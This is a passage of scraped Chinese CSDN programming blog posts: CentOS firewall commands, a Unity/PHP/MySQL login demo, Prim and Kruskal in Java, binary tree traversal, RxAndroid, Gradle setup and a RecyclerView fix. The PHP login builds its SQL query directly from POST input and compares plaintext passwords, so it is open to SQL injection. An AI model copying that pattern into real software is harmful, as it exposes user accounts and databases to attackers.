/etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service.\n\n\n5、重启防火墙\n\n[root@localhost ~]# systemctl restart firewalld.service\n\n\n6、查看防火墙是否开机自启\n\n[root@localhost ~]# systemctl is-enabled firewalld.service;echo $?\nenabled             --自启\n0\n或者：\n[root@localhost ~]# systemctl is-enabled firewalld.service;echo $?\ndisabled                --不自启\n1\n\n\n7、查看已启动的服务列表\n\n[root@localhost ~]# systemctl list-unit-files|grep enabled\nauditd.service                                      enabled \nautovt@.service                                     enabled \navahi-daemon.service                                enabled \ncrond.service                                       enabled \n\n\n8、开启端口\n\n[root@localhost ~]# firewall-cmd --zone=public --add-port=80/tcp --permanent\nsuccess\n命令含义：\n–zone #作用域\n–add-port=80/tcp #添加端口，格式为：端口/通讯协议\n–permanent #永久生效，没有此参数重启后失效\n\n\n9、查看已经开放的端口\n\n[root@localhost ~]# firewall-cmd --list-port\n80/tcp\n\n\n10、屏蔽FirewallD服务\n\n[root@localhost ~]#systemctl mask firewalld\n还可以通过创建一个firewall.service到/dev/null的符号连接来屏蔽防火墙服务。\n\n\n11、反屏蔽FirewallD服务\n\n[root@localhost ~]#systemctl unmask firewalld\n这是反屏蔽FirewallD服务，它会移除屏蔽FirewallD服务时创建的符号链接，故能重新启用服务。\n\n\n12、检查是否已安装防火墙\n\n[root@localhost ~]#yum install firewalld firewall-config\n\n\n13、下面说下CentOS7和6的默认防火墙的区别\n\nCentOS 7默认使用的是firewall作为防火墙，使用iptables必须重新设置一下\n\n1、直接关闭防火墙\n\nsystemctl stop firewalld.service #停止firewall\nsystemctl disable firewalld.service #禁止firewall开机启动\n\n\n2、设置 iptables service\n\nyum -y install iptables-services\n\n\n3、如果要修改防火墙配置，如增加防火墙端口3306\n\nvi /etc/sysconfig/iptables \n增加规则\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT\n保存退出后\nsystemctl restart iptables.service #重启防火墙使配置生效\nsystemctl enable iptables.service #设置防火墙开机启动\n\n\n4、最后重启系统使设置生效即可\n\nsystemctl start iptables.service #打开防火墙\nsystemctl stop iptables.service #关闭防火墙", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/cool_summer_moon/article/details/78744009", "title": "CentOS 7.0 防火墙开启/关闭"}
{"timestamp": "2018_08_14_11_13_10", "desc": "经测试Windows和安卓设备均可运行 \n没有任何加密措施 \nPHP代码是在Apache端运行的，配置MySql服务器时，容许远程登陆 \nPHP端代码\n\n\n\n<?php\n\n$myData=mysqli_connect( \"数据库地址\" ,\"登录名\" ,\"密码\" );\nif ( mysqli_connect_errno())\n{\n    echo \"eron\";\n    return;\n}\n// 选择数据库\nmysqli_query($myData,\"set names utf8\") ;\nmysqli_select_db($myData ,\"qdm219186353_db\" );\n\n// 寻\n$userID=$_POST['PlayerID'];\n$userPWD=$_POST['PlayerPwd'];\n$sql = \"SELECT Id FROM PlayGame where Id=$userID and Pwd='$userPWD' \";\n$result = mysqli_query($myData,$sql)or die(\"<br>SQL error!<br/>\");\n$num_results = mysqli_num_rows($result);\n\necho $num_results;\n?>\n\nUnity端代码\n\n\n\nusing UnityEngine;\nusing System.Collections;\nusing UnityEngine.UI;\n\npublic class Loading : MonoBehaviour {\n\n    public InputField Id;\n    public InputField Pwd;\n    string urlSql = \"php代码的网络位置，我的是：www.wellwj.com/IsLoadPlayer.php\";\n    public void isLoad()\n    {\n        string idText = Id.text;\n        string pwdText = Pwd.text;\n        StartCoroutine(UploadScore(idText, pwdText));\n    }\n\n    IEnumerator UploadScore(string id, string pwd)\n    {\n        WWWForm ws = new WWWForm();\n        ws.AddField(\"PlayerID\", id);\n        ws.AddField(\"PlayerPwd\", pwd);\n        WWW www = new WWW(urlSql, ws);\n        yield return www;\n        if (www.text == \"1\")\n        {\n            Application.LoadLevel(\"Yes\");\n        }\n        else\n        {\n            Application.LoadLevel(\"No\");\n        }\n    }\n}\n\n根据输入的Id和Pwd，搜索数据库中符合条件的数据，有且只有一行时，确认帐号和密码正确 \n所以判断返回值是否为1 \n安卓演示（MIUI） \n \n \n\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/u013553804/article/details/52752245", "title": "unity连接数据库--可在安卓设备连接（PHP服务器+MySql）"}
{"timestamp": "2018_08_14_11_13_10", "desc": "据说Unity可以完美支持中文了，做一个小测试 \nUnity版本：5.2.2 \nVS版本：VS2015 \n首先是创建工程界面： \n \n然后进入主界面，将摄像机改为“主摄像机”，以及Cube和Light均改为中文，在新建一个材质球，取名也是中文。 \n \n \n将材质球拖入到“立方体中” \n \n然后新建一个脚本 \n \n拖入立方体中 \n \n先运行一下 \n \n没报任何错误！ \n开始写测试脚本\n\npublic class 测试脚本 : MonoBehaviour {\n\n    public string 中文测试;\n    void Start () {\n\n        输出(中文测试);\n\n    }\n    void 输出(string 中文)\n    {\n        Debug.Log(中文);\n    }\n}\n\n然后在Unity界面 \n \n运行 \n \n完美，不报错。\n\n\n\n欢迎关注我的微信个人订阅号 \n \n每天多学一点0.0", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/u013553804/article/details/52336533", "title": "Unity中文支持测试"}
{"timestamp": "2018_08_14_11_13_10", "desc": "1 问题提出\n\n1.1 一个公司计划建立一个通信网络来连接它的一个计算机中心。可以用租用的电话线连接这些中心的任何一对。应当妊娠瘙痒哪些连接，以便保证在任何两个计算机中心之间都有通路，且网络的总成本最小？可以用下较长所示的带权图为这个问题建模，其中顶点表示计算机中心，边表示可能租用的电话线，边上的权是边所表示的电话线的月租费。通过找出一棵生成树，使得这棵树的各边的权之和为最小，就可以解决这个问题。这样的生成树称为最小生成树。\n\n1.2 最小生成树定义：在一个具有V个节点的连通无向图中，找到一个子图，该子图包含原图的所有节点和部分连接边，且不能形成回路，同时子图边的权值总和最小。\n\n1.3 最小生成树的算法：根据对安全边的不同规则，有两种算法可以生成最小生成树。即Kruskal算法和Prim算法。\n\n\n\n2 普林算法(Prim)图标演示\n\n\n\n核心思想：用一个待定的最小权值的数组来保存每一个将来有可能与我们相连的临接点的最小权值，直到找到最后最小的临接点，不断的去一个一个连接\n\n2.1 先构造邻接矩阵\n\n \n\n\n\n2.2 lowcost分析\n\n步骤3.V0–V1置0，并保存相连的临接点的最小权值后: \n\n\n步骤2.V0–V5遍历值赋值后: \n\n\n\n\n步骤3.V0–V5置0，并保存相连的临接点的最小权值后: \n\n\n\n\n\n\n2.3 Java源码\n\n\n\npackage com.dn.graph.matrix;\n\nimport java.util.LinkedList;\n\npublic class Graph {\n    private int vertexSize;// 顶点数量\n    private int[] vertexs;// 顶点数组\n    private int[][] matrix;\n    private static final int MAX_WEIGHT = 1000;\n    private boolean[] isVisited;\n\n    public Graph(int vertextSize) {\n        this.vertexSize = vertextSize;\n        matrix = new int[vertextSize][vertextSize];\n        vertexs = new int[vertextSize];\n        for (int i = 0; i < vertextSize; i++) {\n            vertexs[i] = i;\n        }\n        isVisited = new boolean[vertextSize];\n    }\n\n    public int[] getVertexs() {\n        return vertexs;\n    }\n\n    public void setVertexs(int[] vertexs) {\n        this.vertexs = vertexs;\n    }\n\n    /**\n     * 获取某个顶点的出度\n     * \n     * @return\n     */\n    public int getOutDegree(int index) {\n        int degree = 0;\n        for (int j = 0; j < matrix[index].length; j++) {\n            int weight = matrix[index][j];\n            if (weight != 0 && weight != MAX_WEIGHT) {\n                degree++;\n            }\n        }\n        return degree;\n    }\n\n    /**\n     * 获取某个顶点的入度\n     */\n    public int getIntDegree(int index) {\n        int degree = 0;\n        for (int j = 0; j < matrix[index].length; j++) {\n            int weight = matrix[j][index];\n            if (weight != 0 && weight != MAX_WEIGHT) {\n                degree++;\n            }\n        }\n        return degree;\n    }\n\n    /**\n     * 获取两个顶点之间的权值\n     * \n     * @return\n     */\n    public int getWeight(int v1, int v2) {\n        int weight = matrix[v1][v2];\n        return weight == 0 ? 0 : (weight == MAX_WEIGHT ? -1 : weight);\n    }\n\n    /**\n     * 获取某个顶点的第一个邻接点\n     */\n    public int getFirstNeighbor(int index) {\n        for (int j = 0; j < vertexSize; j++) {\n            if (matrix[index][j] > 0 && matrix[index][j] < MAX_WEIGHT) {\n                return j;\n            }\n        }\n        return -1;\n    }\n\n    /**\n     * 在图中取顶点v1的在v2后的下一个邻接点\n     * \n     * @param v1表示要找的顶点\n     * @param v2\n     *            表示该顶点相对于哪个邻接点去获取下一个邻接点\n     */\n    public int getNextNeighbor(int v, int index) {\n        for (int j = index + 1; j < vertexSize; j++) {\n            if (matrix[v][j] > 0 && matrix[v][j] < MAX_WEIGHT) {\n                return j;\n            }\n        }\n        return -1;\n    }\n\n    /**\n     * 对外公开的深度优先遍历\n     */\n    public void depthFirstSearch() {\n        isVisited = new boolean[vertexSize];\n        for (int i = 0; i < vertexSize; i++) {\n            if (!isVisited[i]) {\n                System.out.println(\"访问到了：\" + i + \"顶点\");//0\n                depthFirstSearch(i); // 图的深度优先遍历算法\n            }\n        }\n        isVisited = new boolean[vertexSize];\n    }\n\n    /**\n     * 图的深度优先遍历算法\n     * \n     * depthFirstSearch(0)开始：\n     * w=0,找到v0的第一个临接点v1,访问到了v1，继续depthFirstSearch(1)\n     * w=1,找到v1的第一个临接点v0（v0已经访问了）,跳过去寻找v1的下一个临接点w=getNextNeighbor(1, 0)=2，继续while()循环\n     */\n    private void depthFirstSearch(int i) {\n        isVisited[i] = true;\n        int w = getFirstNeighbor(i);///w=0  v0-v1 v1-v0\n        while (w != -1) {\n            if (!isVisited[w]) {\n                // 需要遍历该顶点\n                System.out.println(\"访问到了：\" + w + \"顶点\");//1\n                depthFirstSearch(w);//w=1,找到v1的第一个临接点v0（v0已经访问了）,跳过去寻找v1的下一个临接点\n            }\n            w = getNextNeighbor(i, w);// 第一个相对于w的邻接点 w=2\n        }\n    }\n\n    /**\n     * 对外公开的广度优先遍历\n     */\n    public void broadFirstSearch() {\n        isVisited = new boolean[vertexSize];\n        for (int i = 0; i < vertexSize; i++) {\n            if (!isVisited[i]) {\n                broadFirstSearch(i);\n            }\n        }\n    }\n\n    /**\n     * 图的广度优先搜索算法\n     * \n     * @param i\n     */\n    private void broadFirstSearch(int i) {\n        int u, w;\n        LinkedList<Integer> queue = new LinkedList<Integer>();\n        System.out.println(\"访问到：\" + i + \"顶点\");\n        isVisited[i] = true;\n        queue.add(i);// 第一次把v0加到队列\n        while (!queue.isEmpty()) {\n            u = (Integer) (queue.removeFirst()).intValue();//出队下标\n            w = getFirstNeighbor(u);\n            while (w != -1) {\n                if (!isVisited[w]) {//w未被访问\n                    System.out.println(\"访问到了：\" + w + \"顶点\");\n                    isVisited[w] = true;\n                    queue.add(w);\n                }\n                w = getNextNeighbor(u, w);\n            }\n        }\n    }\n\n    /**\n     * prim 普里姆算法\n     * \n     */\n    public void prim() {\n        int[] lowcost = new int[vertexSize];// 待定最小代价顶点权值的数组（为0表示已经获取最小权值）\n        int[] adjvex = new int[vertexSize];// 顶点下标数组\n        int min;//最小权值\n        int minId;//当前顶点下标\n        int sum = 0;//权值总和\n        //初始化第0行权值数组，作为基础数组\n        for (int i = 1; i < vertexSize; i++) {\n            lowcost[i] = matrix[0][i];\n        }\n        //遍历所有顶点\n        for (int i = 1; i < vertexSize; i++) {\n            min = MAX_WEIGHT;//初始化最小权值\n            minId = 0;//初始化最小权值下标（V0）\n\n            //1.查找V0余所有关联顶点的（即某一行中）最小的权值和下标，\n            for (int j = 1; j < vertexSize; j++) {\n                if (lowcost[j] < min && lowcost[j] > 0) {\n                    min = lowcost[j];//当前的权值赋值最小权值\n                    minId = j;//最小权值关联顶点下标（V1）\n                }\n            }\n\n            //2.赋值\n            System.out.println(\"前顶点：\" + adjvex[minId] + \"权值：\" + min);\n            sum += min;//每找到一条边最小权值相加\n            lowcost[minId] = 0;//找到后下标置为0，代表此顶点已找到最小权值，再次遍历忽略\n\n            //3.待定的最小权值的数组保存所有当前顶点V1相连的临接点的最小权值（即某一行中与待定最小代价顶点权值的数组的值对比，小的则保存到此数组中）\n            for (int j = 1; j < vertexSize; j++) {\n                if (lowcost[j] != 0 && matrix[minId][j] < lowcost[j]) {//权值不为0，当行关联顶点权值小于对应基础数组值时\n                    lowcost[j] = matrix[minId][j]; //修改“对应基础数组值”为当前最小关联顶点权值\n                    adjvex[j] = minId;//修改关联顶点的“顶点下标数组值\"\n                }\n            }\n        }\n\n        System.out.println(\"最小生成树权值和:\" + sum);\n    }\n\n\n    public static void main(String[] args) {\n        Graph graph = new Graph(9);\n\n        int[] a1 = new int[] { 0, 10, MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT, 11,\n                MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT };\n        int[] a2 = new int[] { 10, 0, 18, MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT,\n                16, MAX_WEIGHT, 12 };\n        int[] a3 = new int[] { MAX_WEIGHT, MAX_WEIGHT, 0, 22, MAX_WEIGHT,\n                MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT, 8 };\n        int[] a4 = new int[] { MAX_WEIGHT, MAX_WEIGHT, 22, 0, 20, MAX_WEIGHT,\n                MAX_WEIGHT, 16, 21 };\n        int[] a5 = new int[] { MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT, 20, 0, 26,\n                MAX_WEIGHT, 7, MAX_WEIGHT };\n        int[] a6 = new int[] { 11, MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT, 26, 0,\n                17, MAX_WEIGHT, MAX_WEIGHT };\n        int[] a7 = new int[] { MAX_WEIGHT, 16, MAX_WEIGHT, MAX_WEIGHT,\n                MAX_WEIGHT, 17, 0, 19, MAX_WEIGHT };\n        int[] a8 = new int[] { MAX_WEIGHT, MAX_WEIGHT, MAX_WEIGHT, 16, 7,\n                MAX_WEIGHT, 19, 0, MAX_WEIGHT };\n        int[] a9 = new int[] { MAX_WEIGHT, 12, 8, 21, MAX_WEIGHT, MAX_WEIGHT,\n                MAX_WEIGHT, MAX_WEIGHT, 0 };\n\n        graph.matrix[0] = a1;\n        graph.matrix[1] = a2;\n        graph.matrix[2] = a3;\n        graph.matrix[3] = a4;\n        graph.matrix[4] = a5;\n        graph.matrix[5] = a6;\n        graph.matrix[6] = a7;\n        graph.matrix[7] = a8;\n        graph.matrix[8] = a9;\n\n        int degree = graph.getIntDegree(4);\n        System.out.println(\"vo的入度:\"+degree);\n        System.out.println(\"权值：\"+graph.getWeight(7,0));\n        degree = graph.getOutDegree(4);\n        System.out.println(\"vo的出度:\"+degree);\n        System.out.println(\"权值：\"+graph.getWeight(2,3));\n\n//      graph.depthFirstSearch();\n//      graph.broadFirstSearch();\n\n//      graph.prim();\n    }\n}\n\n\n\n2.4 参考链接\n\n最小生成树-普林算法(Prim)/克鲁斯卡尔算法(Kruskal) \n\nPrim\n\n 最小生成树（普利姆算法、克鲁斯卡尔算法） \n\n\n\n3 克鲁斯卡尔算法(Kruskal)图标演示\n\n\n\n核心思想：根据边的加权值以递增的方式，一次找出加权值最低的边来构建最小生成树，而且规定：每次添加的边不能造成生成树有回路，知道找到N-1个边为止。\n\n3.1 先构造邻接矩阵\n\n\n\n\n\n3.2 打印分析\n\n\n\n起始顶点：4---结束顶点：7~权值：7\n起始顶点：2---结束顶点：8~权值：8\n起始顶点：0---结束顶点：1~权值：10\n找到起点0\n找到终点:1 //find(0)=1\n起始顶点：0---结束顶点：5~权值：11\n找到起点1\n找到终点:5 //find(1)=5\n起始顶点：1---结束顶点：8~权值：12\n起始顶点：3---结束顶点：7~权值：16\n找到起点1\n找到终点:5 \n找到起点5  \n找到终点:8 //find(1)=5,find(5)=8 \n起始顶点：1---结束顶点：6~权值：16\n找到起点5\n找到终点:8\n找到起点8  //edges[7] 5->6=17\n找到终点:6 //find(5)=8,find(8)=6  与 find(6)=6 ；所以回环\n第7条边回环了\n\n找到起点1\n找到终点:5\n找到起点5\n找到终点:8\n找到起点8\n找到终点:6\n找到起点2\n找到终点:8\n找到起点8\n找到终点:6\n第8条边回环了\n\n起始顶点：6---结束顶点：7~权值：19\n找到起点3\n找到终点:7\n找到起点4\n找到终点:7\n第10条边回环了\n找到起点3\n找到终点:7\n找到起点8\n找到终点:6\n找到起点6\n找到终点:7\n第11条边回环了\n找到起点2\n找到终点:8\n找到起点8\n找到终点:6\n找到起点6\n找到终点:7\n找到起点3\n找到终点:7\n第12条边回环了\n找到起点3\n找到终点:7\n找到起点6\n找到终点:7\n第13条边回环了\n找到起点4\n找到终点:7\n找到起点5\n找到终点:8\n找到起点8\n找到终点:6\n找到起点6\n找到终点:7\n第14条边回环了\nsum:99\n\n\n\n\n3.3 Java源码\n\n\n\npackage com.dn.graph.matrix;\n\npublic class GraphKruskal {\n\n    private Edge[] edges;//顶点数量\n    private int edgeSize;//边数量\n\n    public GraphKruskal(int edgeSize) {\n        this.edgeSize = edgeSize;\n        edges = new Edge[edgeSize];\n    }\n\n    /**\n     * Kruskal算法\n     */\n    public void miniSpanTreeKruskal() {\n        int m, n, sum = 0;\n        int[] parent = new int[edgeSize];// 神奇的数组，下标为起点，值为终点\n        for (int i = 0; i < edgeSize; i++) {\n            parent[i] = 0;\n        }\n        for (int i = 0; i < edgeSize; i++) {\n            n = find(parent, edges[i].begin);//n是起点的终点\n            m = find(parent, edges[i].end);//m是终点的终点\n            if (n != m) {\n                parent[n] = m;\n                System.out.println(\"起始顶点：\" + edges[i].begin + \"---结束顶点：\"+ edges[i].end + \"~权值：\" + edges[i].weight);\n                sum += edges[i].weight;\n            } else {\n                System.out.println(\"第\" + i + \"条边回环了\");\n            }\n        }\n        System.out.println(\"sum:\" + sum);\n    }\n\n    /*\n     * 将神奇数组进行查询获取非回环的值（下标为起点，值为终点）\n     */\n    public int find(int[] parent, int f) {\n        while (parent[f] > 0) {\n            System.out.println(\"找到起点\" + f);\n            f = parent[f];\n            System.out.println(\"找到终点:\" + f);\n        }\n        return f;\n    }\n\n    public void createEdgeArray() {\n        Edge edge0 = new Edge(4, 7, 7);\n        Edge edge1 = new Edge(2, 8, 8);\n        Edge edge2 = new Edge(0, 1, 10);\n        Edge edge3 = new Edge(0, 5, 11);\n        Edge edge4 = new Edge(1, 8, 12);\n        Edge edge5 = new Edge(3, 7, 16);\n        Edge edge6 = new Edge(1, 6, 16);\n        Edge edge7 = new Edge(5, 6, 17);\n        Edge edge8 = new Edge(1, 2, 18);\n        Edge edge9 = new Edge(6, 7, 19);\n        Edge edge10 = new Edge(3, 4, 20);\n        Edge edge11 = new Edge(3, 8, 21);\n        Edge edge12 = new Edge(2, 3, 22);\n        Edge edge13 = new Edge(3, 6, 24);\n        Edge edge14 = new Edge(4, 5, 26);\n        edges[0] = edge0;\n        edges[1] = edge1;\n        edges[2] = edge2;\n        edges[3] = edge3;\n        edges[4] = edge4;\n        edges[5] = edge5;\n        edges[6] = edge6;\n        edges[7] = edge7;\n        edges[8] = edge8;\n        edges[9] = edge9;\n        edges[10] = edge10;\n        edges[11] = edge11;\n        edges[12] = edge12;\n        edges[13] = edge13;\n        edges[14] = edge14;\n    }\n\n    class Edge {\n        private int begin;\n        private int end;\n        private int weight;\n\n        public Edge(int begin, int end, int weight) {\n            super();\n            this.begin = begin;\n            this.end = end;\n            this.weight = weight;\n        }\n\n        public int getBegin() {\n            return begin;\n        }\n\n        public void setBegin(int begin) {\n            this.begin = begin;\n        }\n\n        public int getEnd() {\n            return end;\n        }\n\n        public void setEnd(int end) {\n            this.end = end;\n        }\n\n        public int getWeight() {\n            return weight;\n        }\n\n        public void setWeight(int weight) {\n            this.weight = weight;\n        }\n\n    }\n\n    public static void main(String[] args) {\n        GraphKruskal graphKruskal = new GraphKruskal(15);\n        graphKruskal.createEdgeArray();\n        graphKruskal.miniSpanTreeKruskal();\n    }\n}\n\n\n\n\n3.4 参考链接\n\nkruskal算法\n\nKruskal算法说明及图解", "time": "2018_08_14_11_13_10", "link": "https://blog.csdn.net/chenliguan/article/details/52838543", "title": "数据结构与算法之最小生成树-普林算法(Prim)/克鲁斯卡尔算法(Kruskal)"}
{"timestamp": "2018_08_14_11_13_11", "desc": "二叉树是使用较多的一种树形结构，如比较经典的二叉排序树，Huffman编码等，都使用到了二叉树的结构，同时，在机器学习算法中，基于树的学习算法中也大量使用到二叉树的结构，因此，我们有必要对二叉树的结构有比较详细的了解和掌握。\n\n\n\n一、二叉树的基本概念\n\n\n\n1、二叉树的概念\n\n\n  二叉树（Binary Tree）是包含nn个节点的有限集合，该集合或者为空集（此时，二叉树称为空树），或者由一个根节点和两棵互不相交的、分别称为根节点的左子树和右子树的二叉树组成。\n\n\n一棵典型的二叉树如下图所示：\n\n\n\n由上述的定义可以看出，二叉树中的节点至多包含两棵子树，分别称为左子树和右子树，而左子树和右子树又分别至多包含两棵子树。由上述的定义，二叉树的定义是一种递归的定义。\n\n\n\n2、一些常见的二叉树\n\n\n满二叉树\n\n\n\n  对于一棵二叉树，如果每一个非叶子节点都存在左右子树，并且二叉树中所有的叶子节点都在同一层中，这样的二叉树称为满二叉树。\n\n\n一棵满二叉树如下图所示：\n\n\n\n\n完全二叉树\n\n\n\n  对于一棵具有nn个节点的二叉树按照层次编号，同时，左右子树按照先左后右编号，如果编号为ii的节点与同样深度的满二叉树中编号为ii的节点在二叉树中的位置完全相同，则这棵二叉树称为完全二叉树。\n\n\n一棵完全二叉树如下图所示：\n\n\n\n\n\n3、二叉树的一些性质\n\n对于二叉树，包含一些性质：\n\n\n在二叉树中，第 ii层上至多有2i−12^{i-1}个节点（i≥1i\\geq 1）\n深度为kk的二叉树至多有2k−12^{k-1}个节点（k≥1k\\geq 1）\n对一棵二叉树，如果叶子节点的个数为n0n_0，度为22的节点个数为n2n_2，则n0=n2+1n_0 = n_2 + 1\n具有nn个节点的完全二叉树的深度为⌊log2n⌋+1\\left \\lfloor log _2 n \\right \\rfloor+1\n\n\n二、二叉树的基本操作\n\n\n\n1、二叉树的存储结构\n\n若要想对二叉树进行操作，首先需要定义二叉树的存储结构，对于如下图所示的二叉树：\n\n\n\n其对应的存储有两种：\n\n\n顺序存储结构\n链式存储结构\n\n\n首先，我们来看顺序存储结构，简单来讲，顺序存储结构是指用一维数据存储二叉树中的节点，其中，数组的下标要能体现节点之间的逻辑关系，对于上述的二叉树，其顺序存储结构为：\n\n\n\n在顺序存储结构中，“^”表示的是没有节点，从顺序存储可以看出，若出现大量“^”，则对空间是一种极大的浪费。\n\n在二叉树中，每一个节点至多存在左右子树，因此在链式存储结构中，每一个节点的结构为：\n\n\n\n其中，data 称为数据域，lchild和rchild称为指针域，分别指向左孩子和右孩子。\n\n在实际使用中，根据不同的需要，使用顺序存储结构和链式存储结构。对于链式存储结构，我们定义如下：\n\n\n\ntypedef struct BiNode{\n        int data;// 数据域的值\n        struct BiNode *left;// 左孩子\n        struct BiNode *right;// 右孩子\n}binode;\n\n\n\n2、二叉树的遍历\n\n在二叉树的操作中，二叉树的遍历是基本的操作，对于二叉树的遍历操作，主要分为：\n\n\n前序遍历\n中序遍历\n后序遍历\n层次遍历\n\n\n对于前序遍历，首先遍历根节点，其次遍历左孩子，再遍历右孩子，按照如此的顺序遍历整棵树，其代码如下：\n\n\n\n// 先序遍历\nvoid pre_order(binode *p){\n        if (p != NULL){\n                printf(\"%d\\t\", p->data);\n                pre_order(p->left);\n                pre_order(p->right);\n        }\n}\n\n对于中序遍历，首先遍历左子树，其次遍历父节点，最后遍历右子树，按照如此的顺序遍历整棵树，其代码如下：\n\n\n\n// 中序遍历\nvoid in_order(binode *p){\n        if (p != NULL){\n                in_order(p->left);\n                printf(\"%d\\t\", p->data);\n                in_order(p->right);\n        }\n}\n\n对于后序遍历，首先遍历左子树，其次遍历右子树，最后遍历父节点，其代码如下：\n\n\n\n// 后序遍历\nvoid post_order(binode *p){\n        if (p!= NULL){\n                post_order(p->left);\n                post_order(p->right);\n                printf(\"%d\\t\", p->data);\n        }\n}\n\n对于层次遍历，需要使用链表存储每一层的节点，同时，遍历完一个节点，将其左右子节点增加近链表中，其代码为：\n\n\n\n// 层次遍历\nvoid lever_order(binode *p){\n        // 使用队列\n        list<binode *> t;\n        if (p != NULL){\n                t.push_back(p);\n        }\n\n        while (t.size() > 0){\n                printf(\"%d\\t\", (t.front())->data);\n                if ((t.front())->left != NULL){\n                        t.push_back((t.front())->left);\n                }\n\n                if ((t.front())->right != NULL){\n                        t.push_back((t.front())->right);\n                }\n                t.pop_front();\n        }\n}\n\n最终的遍历结果为：\n\n\n\n参考文献\n\n\n《大话数据结构》\n《数据结构》(C语言版)", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/google19890102/article/details/53926704", "title": "数据结构和算法——二叉树"}
{"timestamp": "2018_08_14_11_13_11", "desc": "Android RxAndroid使用 -- 实现类似定时器功能\n依赖\ncompile 'io.reactivex.rxjava2:rxandroid:2.0.1'\ncompile 'io.reactivex.rxjava2:rxjava:2.1.3'\n2.布局文件中只是简单的TextView控件来显示文本。目前涉及到及所了解的RxAndroid与RxJava中多用到的是 .observeOn(AndroidSchedulers.mainThread())，通知主线程这一块，其它不同还未涉及到。RxAndroid在使用时使用RxJava（Java RxJava学习使用）中的方法,\n\n  @Override protected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_main);\n\n    final TextView textView = (TextView) findViewById(R.id.textView);\n    Observable\n        .just(\"one\", \"two\", \"three\", \"four\", \"five\")// 数据源\n        .map(new Function<String, String>() {\n          @Override public String apply(@NonNull String s) throws Exception {\n            Log.e(\"TAG\",Thread.currentThread().getName()); // 打印io线程名\n            Thread.sleep(1000); // 线程睡眠1秒钟\n            return s;\n          }\n        })\n        .subscribeOn(Schedulers.io()) // 将以上代码订阅在io线程\n        .observeOn(AndroidSchedulers.mainThread()) // 通知主线程\n        .subscribe(new Consumer<String>() { // 主线程订阅\n          @Override public void accept(String s) throws Exception {\n            Log.e(\"TAG\",Thread.currentThread().getName()); // 打印当前线程名\n            textView.setText(s);\n          }\n        });\n  }", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/mazaiting/article/details/78129541", "title": "Android RxAndroid使用"}
{"timestamp": "2018_08_14_11_13_11", "desc": "Grandle官网下载Gradle,地址：https://gradle.org/releases/\n\n下载完毕，直接把zip解压，放到你电脑的软件安装目录下，例如：D:\\gradle;\n3.打开eclipse，Help-->Install new software,输入http://dist.springsource.com/release/TOOLS/gradle,中间区域选项全选，然后一直按下一步，安装完毕，重启eclipse就可以了。\n截图1.png\n\n\n4.使用eclipse新建一个java项目，在项目的根目录下创建一个build.gradle文件，在文件中首行添加apply plugin: 'java'\n截图2.png\n\n\n点击ok，选择Gradle IDE Pack 3.8.x+1.0.x选择安装，并重启eclipse。\n截图3.png\n\n\n\n配置 gradle工程，在工程上右键选择Configure->Convert to Gradle(STS) project，接下来右键Gradle(STS)->Refresh All.在工程上可以看到出现一个G的标记。\n\n截图4.png\n\n6.将src文件夹作为源文件夹，项目右键Source Folder,在Floder name行选择Brower,弹出界面选择src，选择OK。\n\n截图5.png\n\n\n7.配置完成后的项目结构\n\n截图6.png\n\n在build.gradle文件中添加代码，依赖rxjava 2.1.3版本。\napply plugin: 'java'\n\n// 设置 jcenter库地址\nrepositories {  \n    jcenter() // 中央库\n}\n\n// 设置依赖\ndependencies {\n    compile \"io.reactivex.rxjava2:rxjava:2.1.3\" // rxjava依赖库\n}\n\n项目工程上右键Gradle(STS)->Refresh Dependencies ,控制台打印出\nBUILD SUCCESSFUL \nTotal time: 0.086 secs\n\n即依赖成功。", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/mazaiting/article/details/78129538", "title": "Java Eclipse配置gradle编译项目"}
{"timestamp": "2018_08_14_11_13_11", "desc": "最近遇到使用RecyclerView，Glide加载图片，当点击图片进行刷新，不管是局部刷新还是全部刷新的时候，都会使用glide重新加载图片，这时候如果glide加载图片的时候没设置好就会出现刷新的时候闪烁的问题，当然这是我出现的问题。 \n网上很多基本都是说recyclerview刷新闪烁是因为默认动画导致的mRecyclerView.setItemAnimator(new DefaultItemAnimator())，通过自定义动画修改代码\n\n将DefaultItemAnimator类里的代码全部copy到自己写的动画类中，然后做一些修改。\n首先找到private void animateChangeImpl(final ChangeInfo changeInfo) {}方法。\n找到方法里这两句代码：\n1：oldViewAnim.alpha(0).setListener(new VpaListenerAdapter() { ... }\n2：newViewAnimation.translationX(0).translationY(0).setDuration(getChangeDuration()).alpha(1).setListener(new VpaListenerAdapter() { ... }\n替换成：\n1：oldViewAnim.setListener(new VpaListenerAdapter() { ... }\n2newViewAnimation.translationX(0).translationY(0).setDuration(getChangeDuration()).setListener(new VpaListenerAdapter() { ... }\n也就是说分别去掉上述代码中的alpha(0)和alpha(1)，然后保存。这个时候基本就打工告成了。最后在自己的RecyclerView中进行如下调用mRecyclerView.setItemAnimator(new NoAlphaItemAnimator());，再跑起来，bug完美解决。\n\n然而我这样做了，并没有什么卵用 \n还有一种直接方法，setSupportsChangeAnimations(false)直接取消动画 \n` \n((SimpleItemAnimator) mRecyclerView.getItemAnimator()).setSupportsChangeAnimations(false); \n \n都试过并没有解决刷新闪烁的问题。后来发现原来是glide设置了跳过内存缓存skipMemoryCache(true)导致的", "time": "2018_08_14_11_13_11", "link": "https://blog.csdn.net/u010694658/article/details/53421910", "title": "RecyclerView Glide加载图片刷新时会闪一下"}
